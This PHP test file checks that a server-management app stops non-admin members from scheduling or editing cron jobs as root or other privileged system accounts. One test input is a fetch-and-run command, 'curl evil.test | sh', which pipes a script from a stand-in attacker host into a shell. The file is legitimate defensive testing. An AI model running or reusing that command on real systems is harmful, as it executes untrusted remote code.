<?php

use App\Models\CronJob;
use App\Models\Server;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

beforeEach(fn () => $this->withoutVite());

/**
 * A cron line runs its command as an arbitrary system user. Left open, this is
 * the cheapest root escalation available to a member on an assigned server —
 * it would render the terminal, system-user and SSH-key restrictions moot.
 */
test('a member cannot schedule a cron job as root', function () {
    $server = Server::factory()->create();
    $member = User::factory()->member()->create();
    $member->servers()->attach($server);

    $this->actingAs($member)
        ->post(route('cron.store', $server), [
            'user' => 'root',
            'command' => 'curl evil.test | sh',
            'schedule' => '* * * * *',
        ])
        ->assertSessionHasErrors('user');

    expect(CronJob::count())->toBe(0);
});

test('a member cannot escalate through other privileged system accounts', function () {
    $server = Server::factory()->create();
    $member = User::factory()->member()->create();
    $member->servers()->attach($server);

    foreach (['sudo', 'velink-admin', 'www-data', 'daemon'] as $user) {
        $this->actingAs($member)
            ->post(route('cron.store', $server), [
                'user' => $user,
                'command' => 'id',
                'schedule' => '* * * * *',
            ])
            ->assertSessionHasErrors('user');
    }

    expect(CronJob::count())->toBe(0);
});

test('a member can still schedule a cron job as an ordinary user', function () {
    $server = Server::factory()->create();
    $member = User::factory()->member()->create();
    $member->servers()->attach($server);

    $this->actingAs($member)
        ->post(route('cron.store', $server), [
            'user' => 'velink',
            'command' => 'php artisan schedule:run',
            'schedule' => '* * * * *',
        ])
        ->assertSessionHasNoErrors();

    expect(CronJob::count())->toBe(1);
});

test('an admin may still schedule a cron job as root', function () {
    $server = Server::factory()->create();

    $this->actingAs(User::factory()->admin()->create())
        ->post(route('cron.store', $server), [
            'user' => 'root',
            'command' => 'apt-get update',
            'schedule' => '0 3 * * *',
        ])
        ->assertSessionHasNoErrors();

    expect(CronJob::count())->toBe(1);
});

test('the restriction also applies when a member updates an existing cron job', function () {
    $server = Server::factory()->create();
    $member = User::factory()->member()->create();
    $member->servers()->attach($server);

    $cronJob = CronJob::create([
        'server_id' => $server->id,
        'user' => 'velink',
        'command' => 'php artisan schedule:run',
        'schedule' => '* * * * *',
        'status' => 'active',
    ]);

    $this->actingAs($member)
        ->patch(route('cron.update', $cronJob), [
            'user' => 'root',
            'command' => 'id',
            'schedule' => '* * * * *',
        ])
        ->assertSessionHasErrors('user');

    expect($cronJob->fresh()->user)->toBe('velink');
});
